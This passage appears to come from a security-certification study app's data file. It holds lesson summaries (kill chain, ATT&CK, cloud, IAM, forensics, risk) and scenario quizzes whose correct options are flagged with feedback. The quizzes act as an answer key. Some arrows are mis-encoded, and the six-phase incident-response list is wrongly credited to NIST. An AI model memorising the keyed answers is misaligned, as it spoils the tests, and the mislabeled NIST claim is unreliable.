patching for web vulns", "DEP/ASLR protect against memory exploits", "Compensating controls = alternatives with equivalent protection"], "examTips": ["Microsegmentation = zero trust implementation", "WAF blocks SQLi/XSS but doesn't replace secure code", "Compensating control must be equivalent, not inferior", "DNS sinkhole redirects malicious traffic"]}, {"id": "D2-LESSON-011", "domain": 2, "title": "Attack Frameworks", "objectives": ["2.1", "2.4"], "difficulty": "intermediate", "sections": [{"title": "Cyber Kill Chain", "content": "**7 Stages (Lockheed Martin):**\n1. Reconnaissance - Gather information\n2. Weaponization - Create payload\n3. Delivery - Transmit to target\n4. Exploitation - Execute vulnerability\n5. Installation - Establish persistence\n6. Command & Control - Remote communication\n7. Actions on Objectives - Achieve goal\n\n**Key:** Break any link to disrupt attack"}, {"title": "MITRE ATT&CK", "content": "**Structure:**\n- Tactics = Goals (what attackers want)\n- Techniques = Methods (how they do it)\n- Procedures = Specific implementations\n\n**14 Enterprise Tactics:** Reconnaissance, Resource Dev, Initial Access, Execution, Persistence, Priv Esc, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact"}, {"title": "Other Frameworks", "content": "**Diamond Model** - Adversary, Capability, Infrastructure, Victim\n\n**Pen Testing:**\n- Black box - No knowledge\n- White box - Full knowledge\n- Gray box - Partial knowledge\n\n**Red Team vs Pen Test:** Red = objectives-based; Pen test = coverage-based"}], "keyTakeaways": ["Kill Chain: break any stage to disrupt attack", "ATT&CK: Tactics (goals) + Techniques (methods)", "Diamond Model: Adversary, Capability, Infrastructure, Victim", "Red team simulates adversaries; Pen test finds vulnerabilities"], "examTips": ["Know all 7 Kill Chain stages in order", "ATT&CK has 14 Enterprise tactics", "Double-blind = testers AND defenders uninformed", "Black box = no info, White box = full info"]}, {"id": "D2-LESSON-012", "domain": 2, "title": "Security Assessments", "objectives": ["2.3", "2.5"], "difficulty": "intermediate", "sections": [{"title": "Assessment Types", "content": "**Vulnerability Assessment** - Identify weaknesses, automated scanning, broad coverage\n\n**Penetration Testing** - Attempt to exploit vulnerabilities, validates actual risk\n\n**Security Audit** - Verify compliance with standards, policy review\n\n**Risk Assessment** - Identify and evaluate risks, business context"}, {"title": "Scanning Approaches", "content": "**Agent-based** - Software on each system\n**Agentless** - Network-based scanning\n**Credentialed** - Authenticated, deeper results\n**Non-credentialed** - External view\n\n**Tools:** Nessus, Qualys, OpenVAS, Nexpose"}, {"title": "Penetration Testing", "content": "**Phases:** Planning > Recon > Scanning > Exploitation > Post-exploitation > Reporting\n\n**Rules of Engagement:** Scope, timing, communication, limitations\n\n**Authorization:** Written permission required (Get-Out-of-Jail letter)"}, {"title": "Compliance and Reporting", "content": "**SOC 2** - Type I (design), Type II (operating over time)\n**PCI DSS** - Payment card requirements\n\n**Reports:** Executive summary, technical findings, risk ratings, remediation recommendations"}], "keyTakeaways": ["Vulnerability assessment identifies; pen test exploits", "Credentialed scans provide deeper results", "SOC 2 Type II tests controls over time", "Critical findings need 24-72 hour remediation"], "examTips": ["SOC 2 Type I = design, Type II = operating over time", "Pen test needs written authorization", "Credentialed > non-credentialed for accuracy", "Know remediation timelines by severity"]}, {"id": "D3-LESSON-001", "domain": 3, "title": "Security Architecture Concepts", "objectives": ["3.1"], "difficulty": "intermediate", "sections": [{"title": "Architecture Principles", "content": "**Defense in Depth** - Multiple security layers\n**Zero Trust** - Never trust, always verify\n**Least Privilege** - Minimum necessary access\n**Separation of Duties** - No single person controls entire process"}, {"title": "Security Zones", "content": "**DMZ** - Screened subnet for public-facing services\n**Internal Network** - Protected corporate resources\n**Extranet** - Partner/vendor access"}, {"title": "Secure Design", "content": "**Fail-Safe** - Default to secure state on failure\n**Fail-Open** - Allow access on failure (availability priority)\n**Attack Surface Minimization** - Reduce exposure"}], "keyTakeaways": ["Defense in depth = multiple overlapping layers", "Zero Trust = verify everything", "DMZ isolates public-facing services", "Fail-safe defaults to secure state"], "examTips": ["Fail-secure = blocks on failure", "Fail-open = allows on failure", "DMZ sits between firewalls"]}, {"id": "D3-LESSON-002", "domain": 3, "title": "Infrastructure Security", "objectives": ["3.1"], "difficulty": "intermediate", "sections": [{"title": "Network Infrastructure", "content": "**Firewalls** - Packet filtering, stateful, NGFW\n**IDS/IPS** - Detection vs prevention\n**Proxies** - Forward (clients), Reverse (servers)\n**Load Balancers** - Distribute traffic"}, {"title": "Security Appliances", "content": "**WAF** - Web Application Firewall (Layer 7)\n**NGFW** - Next-Gen Firewall (app awareness + IPS)\n**NAC** - Network Access Control"}, {"title": "Virtualization", "content": "**Hypervisor** - Type 1 (bare metal) vs Type 2 (hosted)\n**VM Escape** - Breaking out of VM\n**Container Security** - Isolation, image scanning"}], "keyTakeaways": ["NGFW = firewall + application awareness + IPS", "IDS detects; IPS blocks", "Type 1 hypervisor = more secure"], "examTips": ["Forward proxy = clients; Reverse = servers", "WAF = Layer 7", "NAC checks endpoint compliance"]}, {"id": "D3-LESSON-003", "domain": 3, "title": "Network Security", "objectives": ["3.2"], "difficulty": "intermediate", "sections": [{"title": "Segmentation", "content": "**VLANs** - Logical network separation\n**Subnets** - IP-based division\n**Microsegmentation** - Granular workload isolation"}, {"title": "Secure Protocols", "content": "**TLS 1.3** - Current encryption standard\n**SSH** - Secure remote access\n**IPSec** - Network layer encryption"}, {"title": "Network Access Control", "content": "**802.1X** - Port-based access control\n**RADIUS** - Centralized authentication\n**EAP** - Extensible Authentication Protocol"}], "keyTakeaways": ["VLANs provide Layer 2 separation", "TLS 1.3 is current standard", "802.1X + RADIUS for network auth"], "examTips": ["802.1X = port-based NAC", "IPSec modes: tunnel vs transport", "DNSSEC prevents DNS spoofing"]}, {"id": "D3-LESSON-004", "domain": 3, "title": "Wireless Security", "objectives": ["3.2"], "difficulty": "intermediate", "sections": [{"title": "Wireless Standards", "content": "**WPA3** - Current standard, SAE handshake\n**WPA2-Enterprise** - 802.1X + RADIUS\n**WPA2-Personal** - Pre-shared key"}, {"title": "Authentication", "content": "**EAP-TLS** - Certificate-based (strongest)\n**PEAP** - Password in TLS tunnel\n**Components:** Supplicant > Authenticator > Auth Server"}, {"title": "Wireless Attacks", "content": "**Evil Twin** - Fake AP with same SSID\n**Rogue AP** - Unauthorized access point\n**Deauth** - Force disconnect\n**Prevention:** Wireless IDS, disable WPS"}], "keyTakeaways": ["WPA3 is current standard", "WPA2-Enterprise uses 802.1X", "EAP-TLS with certs is strongest", "Evil twin mimics legitimate network"], "examTips": ["WPA2-Enterprise = 802.1X + RADIUS", "EAP-TLS = most secure", "Disable WPS to prevent PIN attacks"]}, {"id": "D3-LESSON-005", "domain": 3, "title": "Cloud Security", "objectives": ["3.3"], "difficulty": "intermediate", "sections": [{"title": "Service Models", "content": "**IaaS** - Infrastructure (VMs) - You manage: OS up\n**PaaS** - Platform - You manage: Apps, data\n**SaaS** - Software - Provider manages most"}, {"title": "Cloud Controls", "content": "**VPC** - Virtual Private Cloud isolation\n**Security Groups** - Stateful firewall rules\n**NACLs** - Stateless network ACLs\n**IAM** - Identity and access management"}, {"title": "Cloud Threats", "content": "**Misconfiguration** - #1 cloud security issue\n**Insecure APIs** - Exposed interfaces\n**Tools:** CASB, CSPM, CWPP"}], "keyTakeaways": ["IaaS = most customer responsibility", "Misconfiguration is #1 issue", "Security groups = stateful"], "examTips": ["Know shared responsibility model", "CASB = Cloud Access Security Broker", "CSPM = Cloud Security Posture Management"]}, {"id": "D3-LESSON-006", "domain": 3, "title": "Cryptography Implementation", "objectives": ["3.4"], "difficulty": "advanced", "sections": [{"title": "Key Management", "content": "**HSM** - Hardware Security Module\n**KMS** - Key Management Service\n**Key Escrow** - Third-party backup\n**Lifecycle:** Generate > Store > Rotate > Destroy"}, {"title": "Certificate Management", "content": "**Lifecycle:** Request > Issue > Use > Renew/Revoke > Archive\n**Revocation:** CRL (list), OCSP (real-time), OCSP Stapling"}, {"title": "Applications", "content": "**Digital Signatures** - Authenticity + Integrity + Non-repudiation\n**Code Signing** - Verify software authenticity\n**S/MIME** - Email encryption"}], "keyTakeaways": ["HSM provides hardware-based key protection", "Key rotation limits exposure", "OCSP = real-time revocation"], "examTips": ["HSM = tamper-resistant", "OCSP = real-time, CRL = periodic", "Digital signature = private key signs"]}, {"id": "D3-LESSON-007", "domain": 3, "title": "Resilience and Recovery", "objectives": ["3.5"], "difficulty": "intermediate", "sections": [{"title": "High Availability", "content": "**Redundancy** - Duplicate components\n**Clustering** - Multiple servers as one\n**Load Balancing** - Distribute traffic\n**Metrics:** MTBF (between failures), MTTR (to repair)"}, {"title": "Backup Strategies", "content": "**Full** - Complete copy\n**Incremental** - Changes since last backup\n**Differential** - Changes since last full\n**3-2-1 Rule:** 3 copies, 2 media, 1 offsite"}, {"title": "Disaster Recovery", "content": "**RTO** - Recovery Time Objective (how fast)\n**RPO** - Recovery Point Objective (data loss)\n**Sites:** Hot (immediate) > Warm (hours) > Cold (days)"}], "keyTakeaways": ["RTO = time to recover, RPO = data loss", "Hot site = immediate, Cold = days", "3-2-1 backup rule"], "examTips": ["Know backup type differences", "Hot > Warm > Cold (speed and cost)", "RPO determines backup frequency"]}, {"id": "D3-LESSON-008", "domain": 3, "title": "Data Protection", "objectives": ["3.1"], "difficulty": "intermediate", "sections": [{"title": "Data Classification", "content": "**Government:** Top Secret > Secret > Confidential > Unclassified\n**Commercial:** Confidential > Private > Sensitive > Public"}, {"title": "Data States", "content": "**At Rest** - Stored (disk encryption)\n**In Transit** - Moving (TLS, VPN)\n**In Use** - Being processed (secure enclaves)"}, {"title": "DLP", "content": "**Types:** Network DLP, Endpoint DLP, Cloud DLP\n**Functions:** Content inspection, policy enforcement, prevent exfiltration"}], "keyTakeaways": ["Classification drives protection", "Protect data at rest, in transit, in use", "DLP prevents exfiltration"], "examTips": ["Know classification levels", "TLS for transit, encryption for rest", "Data in use is hardest to protect"]}, {"id": "D4-LESSON-001", "domain": 4, "title": "Security Monitoring", "objectives": ["4.1"], "difficulty": "intermediate", "sections": [{"title": "SIEM", "content": "**Functions:** Log aggregation, correlation, alerting, reporting\n**Key Logs:** Firewall, IDS/IPS, Endpoints, Authentication"}, {"title": "SOC Operations", "content": "**Tiers:** Tier 1 (triage), Tier 2 (investigate), Tier 3 (hunt)\n**Metrics:** MTTD (detect), MTTR (respond)"}, {"title": "Log Analysis", "content": "**Windows:** 4624 (success logon), 4625 (failed), 4672 (admin)\n**Syslog:** Emergency (0) to Debug (7)"}], "keyTakeaways": ["SIEM aggregates and correlates logs", "SOC Tier 1 triages, Tier 2 investigates", "Windows 4625 = failed logon"], "examTips": ["Know Windows event IDs", "SIEM monitors, SOAR automates", "Syslog 0 = Emergency"]}, {"id": "D4-LESSON-002", "domain": 4, "title": "Incident Response", "objectives": ["4.8"], "difficulty": "intermediate", "sections": [{"title": "IR Process (NIST)", "content": "**Six Phases:** Preparation, Detection, Containment, Eradication, Recovery, Post-Incident"}, {"title": "Containment", "content": "**Short-term:** Isolate, block IP, disable account\n**Long-term:** Patch, rebuild\n**Balance:** Evidence vs. damage control"}, {"title": "Post-Incident", "content": "**Lessons Learned** - Within 1-2 weeks\n**Questions:** What happened? What worked? What to improve?"}], "keyTakeaways": ["NIST IR: 6 phases", "Containment balances evidence vs damage", "Lessons learned within 1-2 weeks"], "examTips": ["Know NIST IR phases in order", "Containment before eradication", "Document throughout"]}, {"id": "D4-LESSON-003", "domain": 4, "title": "Digital Forensics", "objectives": ["4.9"], "difficulty": "advanced", "sections": [{"title": "Forensic Principles", "content": "**Order of Volatility:** CPU > RAM > Swap > Disk > Logs > Archives\n**Key:** Capture most volatile first"}, {"title": "Evidence Handling", "content": "**Chain of Custody** - Documented trail\n**Write Blockers** - Prevent modification\n**Hash Verification** - Prove integrity"}, {"title": "Artifacts", "content": "**Windows:** Prefetch, Registry, Event logs, MFT\n**Memory:** Processes, connections, encryption keys"}], "keyTakeaways": ["RAM before disk (volatility)", "Chain of custody required", "Write blockers prevent modification"], "examTips": ["Capture memory before shutdown", "Always hash before/after imaging", "Prefetch shows executed programs"]}, {"id": "D4-LESSON-004", "domain": 4, "title": "Vulnerability Management", "objectives": ["4.3"], "difficulty": "intermediate", "sections": [{"title": "VM Lifecycle", "content": "**Cycle:** Discover > Scan > Prioritize > Remediate > Verify > Report"}, {"title": "Prioritization", "content": "**Factors:** CVSS, asset criticality, exploitability, business impact\n**Risk = Likelihood \u00d7 Impact"}, {"title": "Remediation", "content": "**Patching** - Test first\n**Compensating Controls** - When patching isn't possible\n**Risk Acceptance** - Document decision"}], "keyTakeaways": ["VM is continuous", "Prioritize by CVSS + criticality", "Test patches first"], "examTips": ["External vulns higher priority", "Compensating controls = alternative", "Document risk acceptance"]}, {"id": "D4-LESSON-005", "domain": 4, "title": "Identity and Access Management", "objectives": ["4.6"], "difficulty": "intermediate", "sections": [{"title": "IAM Lifecycle", "content": "**Stages:** Provisioning, Management, Review, Deprovisioning\n**Joiner-Mover-Leaver processes"}, {"title": "Access Control Models", "content": "**DAC** - Owner decides\n**MAC** - Labels/clearances\n**RBAC** - Role-based\n**ABAC** - Attribute-based"}, {"title": "PAM", "content": "**Components:** Account discovery, password vaulting, session monitoring\n**Best Practices:** No shared admins, MFA for privileged"}], "keyTakeaways": ["IAM lifecycle: Provision > Manage > Review > Deprovision", "RBAC = most common", "PAM protects privileged accounts"], "examTips": ["MAC uses labels, RBAC uses roles", "PAM = privileged access management", "Deprovisioning must be immediate"]}, {"id": "D4-LESSON-006", "domain": 4, "title": "Data Protection Operations", "objectives": ["4.2"], "difficulty": "intermediate", "sections": [{"title": "Data Roles", "content": "**Owner** - Business accountability\n**Custodian** - Technical responsibility\n**Steward** - Data quality"}, {"title": "Data Sanitization", "content": "**Clearing** - Logical deletion (recoverable)\n**Purging** - Overwriting (harder to recover)\n**Destruction** - Physical (unrecoverable)\n**Crypto-shredding** - Destroy the key"}, {"title": "Privacy", "content": "**PII** - Personally Identifiable Info\n**PHI** - Protected Health Info\n**Regulations:** GDPR, HIPAA, CCPA"}], "keyTakeaways": ["Owner = business, Custodian = technical", "Destruction > Purging > Clearing", "Crypto-shredding = destroy key"], "examTips": ["Know owner vs custodian", "Degaussing for magnetic media", "GDPR = EU privacy"]}, {"id": "D4-LESSON-007", "domain": 4, "title": "Security Automation", "objectives": ["4.5"], "difficulty": "intermediate", "sections": [{"title": "SOAR", "content": "**Components:** Orchestration, Automation, Response\n**Playbooks:** Documented automated procedures"}, {"title": "Use Cases", "content": "**Common:** Phishing response, malware containment, user deprovisioning\n**Benefits:** Speed, consistency, reduced analyst fatigue"}, {"title": "Implementation", "content": "**Start Simple:** High-volume, repeatable tasks\n**Human-in-the-Loop:** Approval for critical actions\n**Metrics:** Time saved, accuracy"}], "keyTakeaways": ["SOAR connects and automates tools", "Playbooks standardize response", "Keep human approval for critical decisions"], "examTips": ["SOAR = orchestration + automation + response", "Playbooks are automated runbooks", "Measure automation effectiveness"]}, {"id": "D5-LESSON-001", "domain": 5, "title": "Security Governance", "objectives": ["5.1"], "difficulty": "intermediate", "sections": [{"title": "Governance Structure", "content": "**Board** - Ultimate oversight, risk appetite\n**Executive** - Strategy, resources\n**CISO** - Security program leadership"}, {"title": "Policy Framework", "content": "**Policy** - What (high-level intent)\n**Standards** - Specific requirements\n**Procedures** - How (step-by-step)\n**Guidelines** - Recommendations"}, {"title": "Security Roles", "content": "**Data Owner** - Classification, access decisions\n**Data Custodian** - Technical implementation\n**System Owner** - System responsibility"}], "keyTakeaways": ["Governance = direction and oversight", "Policy = what, Procedure = how", "Data owner = business accountability"], "examTips": ["Standards are mandatory, guidelines not", "Data owner makes classification decisions", "Board sets risk appetite"]}, {"id": "D5-LESSON-002", "domain": 5, "title": "Risk Management", "objectives": ["5.2"], "difficulty": "intermediate", "sections": [{"title": "Risk Process", "content": "**Steps:** Identify > Analyze > Evaluate > Treat > Monitor\n**Risk Register:** Document all risks"}, {"title": "Risk Analysis", "content": "**Qualitative:** High/Medium/Low\n**Quantitative:** ALE = SLE \u00d7 ARO\n- SLE = Single Loss Expectancy\n- ARO = Annual Rate of Occurrence"}, {"title": "Risk Treatment", "content": "**Mitigate** - Reduce with controls\n**Transfer** - Insurance, contracts\n**Accept** - Document and acknowledge\n**Avoid** - Eliminate the source\n**Residual Risk** = After treatment"}], "keyTakeaways": ["ALE = SLE \u00d7 ARO", "Four treatments: Mitigate, Transfer, Accept, Avoid", "Residual risk remains after controls"], "examTips": ["Know the ALE formula", "Risk acceptance must be documented", "Transfer = insurance"]}, {"id": "D5-LESSON-003", "domain": 5, "title": "Third-Party Risk Management", "objectives": ["5.3"], "difficulty": "intermediate", "sections": [{"title": "TPRM Lifecycle", "content": "**Stages:** Due Diligence > Contracting > Onboarding > Monitoring > Offboarding"}, {"title": "Assessment Methods", "content": "**Questionnaires** - Self-reported (SIG)\n**Audits** - On-site verification\n**SOC Reports** - Third-party attestation\n**Continuous Monitoring** - Security ratings"}, {"title": "Contract Requirements", "content": "**Key Clauses:** Right to audit, breach notification, data handling, security requirements, termination procedures"}], "keyTakeaways": ["TPRM covers entire vendor lifecycle", "Right to audit is essential", "SOC 2 Type II validates controls over time"], "examTips": ["Due diligence before contract", "SOC 2 Type II = controls over time", "Breach notification in contract"]}, {"id": "D5-LESSON-004", "domain": 5, "title": "Security Compliance", "objectives": ["5.4"], "difficulty": "intermediate", "sections": [{"title": "Frameworks", "content": "**NIST CSF** - Identify, Protect, Detect, Respond, Recover\n**ISO 27001** - ISMS certification\n**CIS Controls** - Prioritized controls"}, {"title": "Regulations", "content": "**HIPAA** - Healthcare\n**PCI DSS** - Payment cards\n**GDPR** - EU privacy\n**SOX** - Financial reporting"}, {"title": "Compliance Management", "content": "**Gap Analysis** - Current vs required\n**Evidence Collection** - Prove compliance\n**Key:** Compliance \u2260 Security"}], "keyTakeaways": ["NIST CSF: 5 functions", "Compliance doesn't equal security", "Gap analysis identifies what's missing"], "examTips": ["NIST CSF 5 functions in order", "PCI DSS for payment cards", "HIPAA for healthcare"]}, {"id": "D5-LESSON-005", "domain": 5, "title": "Audits and Assessments", "objectives": ["5.5"], "difficulty": "intermediate", "sections": [{"title": "Audit Types", "content": "**Internal** - Organization's assessors\n**External** - Independent third party\n**Regulatory** - Government/regulator"}, {"title": "Assessment Process", "content": "**Stages:** Planning > Fieldwork > Reporting > Follow-up\n**Evidence Types:** Documentation, observation, inquiry, reperformance"}, {"title": "Reports", "content": "**Components:** Executive summary, scope, findings, recommendations, management response\n**Ratings:** Critical, High, Medium, Low, Informational"}], "keyTakeaways": ["Internal audits are organization-led", "External audits provide independence", "Management must respond to findings"], "examTips": ["External = independence", "SOC 2 = external attestation", "Findings need management response"]}, {"id": "D5-LESSON-006", "domain": 5, "title": "Security Awareness", "objectives": ["5.6"], "difficulty": "beginner", "sections": [{"title": "Awareness Program", "content": "**Components:** Training, Communications, Simulations, Metrics\n**Goal:** Change behavior, not just knowledge"}, {"title": "Training Methods", "content": "**CBT** - Computer-based (scalable)\n**Instructor-Led** - Interactive\n**Simulations** - Realistic scenarios\n**Role-Based** - Execs, IT, developers, general"}, {"title": "Metrics", "content": "**Phishing:** Click rate (<5% good), Report rate (>30% good)\n**Other:** Training completion, quiz scores, incident reduction"}], "keyTakeaways": ["Awareness aims to change behavior", "Role-based training for different audiences", "Measure click rate AND report rate"], "examTips": ["Click rate < 5% is good", "Report rate > 30% is good", "Training must be role-based"]}];

const SIMULATION_DATA = [{"id": "D1-REM-001", "domain": 1, "type": "REM", "title": "Policy Fundamentals Deep Dive", "difficulty": "beginner", "role": "grc_analyst", "organization": {"name": "Coastal Community Bank"}, "introduction": "You've recently joined Coastal Community Bank as a junior GRC analyst. Your manager has noticed gaps in documentation and has assigned you to help rebuild the policy framework from the ground up. This is an opportunity to learn the fundamentals while contributing real value.", "decision_points": [{"id": "D1R1-DP-001", "title": "Policy vs Standard vs Procedure", "situation": "Your manager hands you a document and asks you to identify what type it is. The document reads: 'Step 1: Log into the admin console at https://admin.coastalbank.com. Step 2: Navigate to User Management. Step 3: Select the user account. Step 4: Click 'Disable Account' and confirm.'", "question": "What type of security document is this?", "options": [{"id": "A", "text": "Policy - it's an official document about security", "is_optimal": false, "feedback": "Not quite. Policies are high-level statements of intent (what and why), not step-by-step instructions. This document tells HOW to do something, not WHAT should be done or WHY."}, {"id": "B", "text": "Standard - it defines specific requirements", "is_optimal": false, "feedback": "Close, but standards define WHAT must be done (specific requirements), not HOW to do it. A standard might say 'Terminated user accounts must be disabled within 24 hours.' This document shows the steps to achieve that."}, {"id": "C", "text": "Procedure - it provides step-by-step operational instructions", "is_optimal": true, "feedback": "Correct! Procedures provide detailed, step-by-step instructions for HOW to accomplish tasks. They're operational documents that staff follow to implement standards. The numbered steps and specific UI navigation clearly identify this as a procedure."}, {"id": "D", "text": "Guideline - it's optional best practice advice", "is_optimal": false, "feedback": "Guidelines are optional recommendations. This document appears to be mandatory operational instructions (disabling accounts is a required action, not optional). The prescriptive 'Step 1, Step 2' format indicates a required procedure."}]}, {"id": "D1R1-DP-002", "title": "Control Function Classification", "situation": "You're reviewing controls and need to classify them by function. Your manager shows you this control: 'Security awareness training is provided to all employees annually covering phishing recognition, password security, and data handling.'", "question": "What is the PRIMARY function of this control?", "options": [{"id": "A", "text": "Detective - it helps identify security incidents", "is_optimal": false, "feedback": "Detective controls identify incidents after or as they occur (like IDS, log monitoring, audit trails). Training happens before incidents - it's designed to stop employees from falling for attacks in the first place."}, {"id": "B", "text": "Preventive - it stops incidents before they happen", "is_optimal": true, "feedback": "Correct! Security awareness training is preventive - it equips employees to recognize and avoid threats like phishing, preventing incidents from occurring. Trained employees don't click malicious links in the first place."}, {"id": "C", "text": "Corrective - it fixes issues after they're found", "is_optimal": false, "feedback": "Corrective controls fix problems after detection (like patch management, backup restoration). Training is proactive - it happens before incidents, not in response to them."}, {"id": "D", "text": "Compensating - it's an alternative when other controls fail", "is_optimal": false, "feedback": "Compensating controls substitute for primary controls that aren't feasible. Training is a primary control in its own right, not a workaround. Every organization should have security awareness training as a baseline."}]}, {"id": "D1R1-DP-003", "title": "Control Type Classification", "situation": "Now classify the same training control by implementation type (how it's implemented).", "question": "What TYPE of control is security awareness training?", "options": [{"id": "A", "text": "Technical - it uses technology", "is_optimal": false, "feedback": "While training might be delivered via technology (LMS, videos), the control itself operates through people - it changes human behavior. Technical controls operate through technology systems (firewalls, encryption). Training is about educating people."}, {"id": "B", "text": "Administrative - it operates through people and processes", "is_optimal": true, "feedback": "Correct! Training is an administrative (managerial) control - it operates by influencing human behavior through education and awareness. Administrative controls include policies, procedures, training, background checks, and access reviews - all people-and-process focused."}, {"id": "C", "text": "Physical - it protects physical assets", "is_optimal": false, "feedback": "Physical controls protect tangible assets and spaces - locks, fences, guards, badges. Training protects through education, not physical barriers."}, {"id": "D", "text": "Hybrid - it combines multiple types", "is_optimal": false, "feedback": "While some controls are hybrid, training is squarely administrative. It's human-focused and process-based. The goal is changing employee behavior through education - a people-centric approach."}]}, {"id": "D1R1-DP-004", "title": "Complete Control Classification", "situation": "Your manager asks you to fully classify this control: 'Motion-activated cameras record all access to the server room, with footage reviewed daily by security staff.'", "question": "How should this control be classified by FUNCTION and TYPE?", "options": [{"id": "A", "text": "Preventive + Physical - cameras prevent unauthorized access to physical spaces", "is_optimal": false, "feedback": "Cameras don't prevent access - they record it. Someone can still walk into the server room; the camera captures footage. The prevention aspect (if any) is psychological deterrence, not physical prevention. Locks prevent; cameras detect."}, {"id": "B", "text": "Detective + Physical - cameras detect unauthorized access through physical monitoring", "is_optimal": true, "feedback": "Excellent! Function: Detective - the camera records events for later review, detecting unauthorized access. Type: Physical - it's a tangible device protecting physical space. The daily review is the detective activity identifying incidents."}, {"id": "C", "text": "Deterrent + Technical - cameras use technology to discourage threats", "is_optimal": false, "feedback": "Cameras can have deterrent effect, but the scenario describes recording and daily review - that's detection, not deterrence. Also, while cameras use technology, they're categorized as physical controls because they protect physical spaces."}, {"id": "D", "text": "Corrective + Administrative - footage helps correct security issues", "is_optimal": false, "feedback": "Corrective controls fix problems after detection. Cameras detect - they don't fix anything. Also, cameras are physical devices, not administrative (people/process) controls. The review process is administrative, but the camera itself is physical."}]}, {"id": "D1R1-DP-005", "title": "Defense in Depth Application", "situation": "You're reviewing the bank's data center security and need to recommend controls for defense in depth. Currently, badge readers control data center entry.", "question": "Which combination BEST implements defense in depth for data center access?", "options": [{"id": "A", "text": "Add a second badge reader for redundancy", "is_optimal": false, "feedback": "A second badge reader is just redundancy of the same control, not defense in depth. If badges are compromised or shared, two readers don't help. Defense in depth requires different types of controls that address different attack vectors."}, {"id": "B", "text": "Badge reader + security camera + visitor log + security awareness training", "is_optimal": true, "feedback": "Excellent defense in depth! Multiple control types: Physical (badge, camera), Administrative (visitor log, training), Multiple functions: Preventive (badge), Detective (camera, log), Preventive (training). Each layer addresses different threats and failure modes."}, {"id": "C", "text": "Replace badge with biometric only - it's more secure", "is_optimal": false, "feedback": "Biometrics may be stronger than badges, but replacing one control with another isn't defense in depth. Defense in depth layers multiple controls. Also, biometrics have their own weaknesses - what if the reader fails?"}, {"id": "D", "text": "Add three more badge readers at different entrance points", "is_optimal": false, "feedback": "More entry points with the same control type doesn't create defense in depth. If badges can be stolen or cloned, having them at multiple doors doesn't help. You need different control types, not more of the same."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-REM-002", "domain": 1, "type": "REM", "title": "Authentication & Access Foundations", "difficulty": "beginner", "role": "security_engineer", "organization": {"name": "SecureStart Solutions"}, "introduction": "You've joined SecureStart Solutions, a growing SaaS company, as a junior security engineer. The company is implementing a proper identity and access management system after operating informally during startup phase. Your manager is using this as a teaching opportunity to ensure you understand the fundamentals.", "decision_points": [{"id": "D1R2-DP-001", "title": "AAA Fundamentals", "situation": "Your manager asks you to explain what happens when an employee logs into the company's HR system and views their pay stub. Walk through the AAA process.", "question": "What is the correct sequence of AAA operations for this scenario?", "options": [{"id": "A", "text": "Authorization (check if they can access HR) \u00e2\u2020\u2019 Authentication (verify identity) \u00e2\u2020\u2019 Accounting (log the access)", "is_optimal": false, "feedback": "The order is wrong. You can't authorize someone before you know who they are. Authentication must come first - you need to verify identity before checking permissions."}, {"id": "B", "text": "Authentication (verify identity) \u00e2\u2020\u2019 Authorization (check permissions) \u00e2\u2020\u2019 Accounting (log the access)", "is_optimal": true, "feedback": "Correct! First, authentication verifies the employee is who they claim (login). Then authorization checks if they can view pay stubs (permission check). Finally, accounting logs that they accessed the system and viewed their stub."}, {"id": "C", "text": "Accounting (log the attempt) \u00e2\u2020\u2019 Authentication (verify identity) \u00e2\u2020\u2019 Authorization (grant access)", "is_optimal": false, "feedback": "While logging the attempt early has value, the functional sequence is AuthN \u00e2\u2020\u2019 AuthZ. Accounting primarily records what happened after access decisions, though login attempts may be logged regardless of success."}, {"id": "D", "text": "Authentication and Authorization happen simultaneously, then Accounting", "is_optimal": false, "feedback": "They're sequential, not simultaneous. The system must know WHO before it can determine WHAT they can do. Authorization decisions depend on the authenticated identity."}]}, {"id": "D1R2-DP-002", "title": "Authentication vs Authorization", "situation": "A help desk ticket reads: 'I can log in fine, but I get Access Denied when trying to open the Q4 financial report.'", "question": "Is this an authentication problem or an authorization problem?", "options": [{"id": "A", "text": "Authentication - they need to prove their identity differently", "is_optimal": false, "feedback": "They can log in successfully - that means authentication is working. The identity verification step passed. The problem occurs after login when trying to access a specific resource."}, {"id": "B", "text": "Authorization - they're authenticated but lack permission for that resource", "is_optimal": true, "feedback": "Correct! Successful login means authentication passed - the system verified their identity. 'Access Denied' on a specific resource means authorization failed - they don't have permission to access the Q4 financial report."}, {"id": "C", "text": "Accounting - the system isn't logging their access properly", "is_optimal": false, "feedback": "Accounting problems would be about missing logs or audit trails, not 'Access Denied' errors. The user is being actively blocked from a resource - that's an authorization decision."}, {"id": "D", "text": "Both - they need to re-authenticate for financial data", "is_optimal": false, "feedback": "Step-up authentication for sensitive data is a valid concept, but the ticket describes 'Access Denied,' not a re-authentication prompt. The current issue is permissions. If step-up auth was needed, they'd see an authentication challenge."}]}, {"id": "D1R2-DP-003", "title": "Authentication Factors", "situation": "The company is implementing MFA. A colleague suggests requiring both a password and a security question for all users.", "question": "Is this true multi-factor authentication?", "options": [{"id": "A", "text": "Yes - two pieces of information are required", "is_optimal": false, "feedback": "Multi-factor isn't about the number of inputs - it's about different TYPES of factors. Password and security question are both 'something you know.' Two knowledge factors don't provide MFA's security benefits."}, {"id": "B", "text": "No - both are 'something you know' factors; true MFA requires different factor types", "is_optimal": true, "feedback": "Exactly right. MFA requires factors from different categories (know, have, are). Password + security question = two knowledge factors = single-factor authentication with extra steps. True MFA example: password (know) + authenticator app code (have)."}, {"id": "C", "text": "Yes - the more questions, the more secure", "is_optimal": false, "feedback": "More of the same factor type doesn't significantly improve security. An attacker who phishes a password can phish security questions too. The strength of MFA comes from requiring different attack methods to compromise different factor types."}, {"id": "D", "text": "It depends on how complex the security question is", "is_optimal": false, "feedback": "Complexity doesn't change the factor type. A complex security question is still 'something you know.' The vulnerability is the factor category, not the complexity. Both can be stolen via phishing regardless of complexity."}]}, {"id": "D1R2-DP-004", "title": "MFA Implementation", "situation": "You're recommending MFA methods for the company. The CISO asks which MFA option provides the strongest protection against phishing attacks.", "question": "Which MFA method is MOST resistant to phishing?", "options": [{"id": "A", "text": "SMS-based one-time passwords", "is_optimal": false, "feedback": "SMS OTP is vulnerable to several attacks: SIM swapping, SS7 protocol attacks, and real-time phishing (attacker proxies victim's SMS code). Better than no MFA, but not phishing-resistant."}, {"id": "B", "text": "Email-based one-time passwords", "is_optimal": false, "feedback": "Email OTP has a circular dependency problem - if attackers phish your email password, they get your MFA codes too. Also vulnerable to real-time phishing proxy attacks. Generally considered weak MFA."}, {"id": "C", "text": 